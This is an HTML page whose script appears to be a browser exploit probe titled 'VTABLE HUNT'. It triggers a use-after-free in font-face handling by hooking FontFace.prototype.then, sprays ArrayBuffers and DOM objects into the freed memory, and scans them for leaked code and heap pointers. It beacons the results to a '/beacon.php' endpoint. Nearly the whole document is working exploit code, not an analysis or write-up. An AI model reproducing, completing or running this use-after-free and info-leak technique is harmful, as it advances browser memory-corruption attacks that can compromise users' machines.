<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1132</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
</head><body><div id="log"></div>
<script>
var L=document.getElementById('log');
function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}

log('phase','=== P1132: VTABLE HUNT ===');
log('info','Trigger UAF → spray DOM objects with vtables → read via ArrayBuffer');
B('P1132-START','t='+Date.now());

var RESULTS=[];

// ===== STRATEGY =====
// 1. Trigger CSSFontFace UAF (192 bytes freed)
// 2. IMMEDIATELY spray 192-byte DOM objects that HAVE vtable pointers
// 3. Then free those objects and spray ArrayBuffer to read stale vtable
//
// Objects to try (all DOM/CSS, ~192 bytes or close, WITH vtable at +0):
// - CSSStyleDeclaration objects (created by element.style)
// - CSSRule objects (from stylesheet)
// - HTMLElement nodes of specific type
// - Event objects
// - TextEncoder/TextDecoder instances
// - Blob objects
// - File objects
// - FormData objects
// - Headers objects (fetch API)
// - URLSearchParams objects

// Step 1: Mass-create various object types and check their sizes via GC pressure
log('info','Phase 1: Object type survey...');

// Create objects and measure which get GC'd (proxy for allocation)
var objectTypes=[];

// Type A: CSSStyleRule objects (from stylesheet)
try{
  var sheet=document.createElement('style');
  document.head.appendChild(sheet);
  var rules=[];
  for(var i=0;i<200;i++){
    sheet.sheet.insertRule('.c'+i+'{color:red;font-size:12px;margin:1px;padding:2px}',i);
    rules.push(sheet.sheet.cssRules[i]);
  }
  objectTypes.push({name:'CSSStyleRule',count:rules.length,objs:rules,sheet:sheet});
}catch(e){log('fail','CSSStyleRule: '+e.message);}

// Type B: Event objects
try{
  var events=[];
  for(var i=0;i<200;i++){
    events.push(new CustomEvent('evt'+i,{detail:{idx:i,data:'padding'.repeat(5)}}));
  }
  objectTypes.push({name:'CustomEvent',count:events.length,objs:events});
}catch(e){log('fail','CustomEvent: '+e.message);}

// Type C: DOMRect objects (from getBoundingClientRect)
try{
  var rects=[];
  var rectDiv=document.createElement('div');
  rectDiv.style.cssText='width:100px;height:100px';
  document.body.appendChild(rectDiv);
  for(var i=0;i<200;i++){
    rects.push(rectDiv.getBoundingClientRect());
  }
  document.body.removeChild(rectDiv);
  objectTypes.push({name:'DOMRect',count:rects.length,objs:rects});
}catch(e){log('fail','DOMRect: '+e.message);}

// Type D: CSSStyleDeclaration via getComputedStyle
try{
  var compStyles=[];
  for(var i=0;i<50;i++){
    var d=document.createElement('div');
    d.className='c'+i;
    d.style.cssText='width:'+i+'px;height:'+i+'px;color:rgb('+i+',0,0)';
    document.body.appendChild(d);
    compStyles.push({el:d,cs:getComputedStyle(d)});
  }
  objectTypes.push({name:'ComputedStyle',count:compStyles.length,objs:compStyles});
}catch(e){log('fail','ComputedStyle: '+e.message);}

// Type E: Headers objects (from Fetch API)
try{
  var headers=[];
  for(var i=0;i<200;i++){
    headers.push(new Headers({'X-Test-'+i:'value'+i,'Content-Type':'text/plain'}));
  }
  objectTypes.push({name:'Headers',count:headers.length,objs:headers});
}catch(e){log('fail','Headers: '+e.message);}

// Type F: URLSearchParams
try{
  var usps=[];
  for(var i=0;i<200;i++){
    usps.push(new URLSearchParams('a='+i+'&b=test&c=data&d='+i*2));
  }
  objectTypes.push({name:'URLSearchParams',count:usps.length,objs:usps});
}catch(e){log('fail','URLSearchParams: '+e.message);}

// Type G: Blob objects
try{
  var blobs=[];
  for(var i=0;i<200;i++){
    blobs.push(new Blob(['data_'+i+'_'.repeat(20)],{type:'text/plain'}));
  }
  objectTypes.push({name:'Blob',count:blobs.length,objs:blobs});
}catch(e){log('fail','Blob: '+e.message);}

// Type H: FormData objects
try{
  var fds=[];
  for(var i=0;i<200;i++){
    var fd=new FormData();
    fd.append('key'+i,'val'+i);
    fd.append('extra','data');
    fds.push(fd);
  }
  objectTypes.push({name:'FormData',count:fds.length,objs:fds});
}catch(e){log('fail','FormData: '+e.message);}

B('P1132-TYPES','count='+objectTypes.length+'|names='+objectTypes.map(function(t){return t.name+':'+t.count;}).join(','));

// Step 2: Now trigger UAF with both ArrayBuffer AND object spray simultaneously
log('info','Phase 2: UAF + simultaneous spray...');

var r=Date.now()%10000;
var uafHit=false,uafMap=null;

var st2=document.createElement('style');
st2.textContent="@font-face{font-family:v"+r+";src:local(Arial);unicode-range:U+0042;}";
document.head.appendChild(st2);
var ff2=new FontFace('g'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
document.fonts.add(ff2);void ff2.loaded;

Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
  if(uafHit)return undefined;uafHit=true;
  if(st2.parentNode)st2.remove();
  try{document.fonts.delete(this);}catch(e){}
  document.body.offsetHeight;

  // Spray BOTH ArrayBuffers AND DOM objects of various types
  uafMap=[];

  // 192-byte ArrayBuffers (matching CSSFontFace size)
  for(var i=0;i<50;i++){
    uafMap.push({type:'AB',size:192,ab:new ArrayBuffer(192),idx:i});
  }

  // Additional 160/224 byte buffers (adjacent size classes)
  for(var i=0;i<20;i++){
    uafMap.push({type:'AB160',size:160,ab:new ArrayBuffer(160),idx:i});
    uafMap.push({type:'AB224',size:224,ab:new ArrayBuffer(224),idx:i});
  }

  // Also create more CSSStyleRule objects (same IsoHeap zone as CSSFontFace? maybe not, but worth trying)
  try{
    var spraySheet=document.createElement('style');
    document.head.appendChild(spraySheet);
    for(var i=0;i<100;i++){
      spraySheet.sheet.insertRule('.spray'+r+'_'+i+'{color:red;background:blue;margin:1px;padding:2px;border:1px solid;font-size:12px}',i);
    }
  }catch(e){}

  try{document.fonts.check('1em v'+r);}catch(e){}
  return undefined;
},set:function(){}});

document.fonts.load('1em g'+r+', v'+r,'AB').then(function(){},function(){});

// Scan for ANY non-zero data in the ArrayBuffers
for(var t=5;t<=250;t+=2){(function(ms){setTimeout(function(){
  if(!uafMap)return;
  for(var bi=0;bi<uafMap.length;bi++){
    if(uafMap[bi].type!=='AB'&&uafMap[bi].type!=='AB160'&&uafMap[bi].type!=='AB224')continue;
    var b=new BigUint64Array(uafMap[bi].ab);
    for(var q=0;q<b.length;q++){
      if(b[q]!==0n){
        // FOUND non-zero data! Analyze what's there
        var dump=[];
        for(var j=0;j<b.length;j++){
          if(b[j]!==0n){
            var h=Number(b[j]>>32n);
            var tag=h>=0x200&&h<=0x7FFF?'CODE':h>=0x10&&h<=0xFF?'HEAP':h>=0xFFFF8000?'KERN':'val';
            dump.push('q'+j+'='+hex64(b[j])+'('+tag+')');
          }
        }

        // Is this CSSFontFace (refcount=1 at q0)?
        var isCFF=b[0]===1n;
        // Does it have a CODE pointer anywhere?
        var hasCode=false;
        for(var j=0;j<b.length;j++){
          var hh=Number(b[j]>>32n);
          if(hh>=0x200&&hh<=0x7FFF)hasCode=true;
        }

        var tag2=uafMap[bi].type+'_'+uafMap[bi].idx;
        B('P1132-HIT','bi='+bi+'|ms='+ms+'|'+tag2+'|cff='+isCFF+'|code='+hasCode+'|'+dump.join(','));
        RESULTS.push(tag2+'|cff='+isCFF+'|code='+hasCode+'|'+dump.slice(0,8).join(','));
        log(hasCode?'win':'ptr','HIT '+tag2+': code='+hasCode+' | '+dump.slice(0,6).join(' '));

        // Only report first few hits per buffer
        break;
      }
    }
  }
},ms);})(t);}

setTimeout(function(){
  delete FontFace.prototype.then;
  B('P1132-DONE','hits='+RESULTS.length);
  log('phase','=== DONE: '+RESULTS.length+' hits ===');

  // Dump all results
  for(var i=0;i<RESULTS.length;i++){
    B('P1132-R'+i,RESULTS[i]);
  }
},400);
</script></body></html>
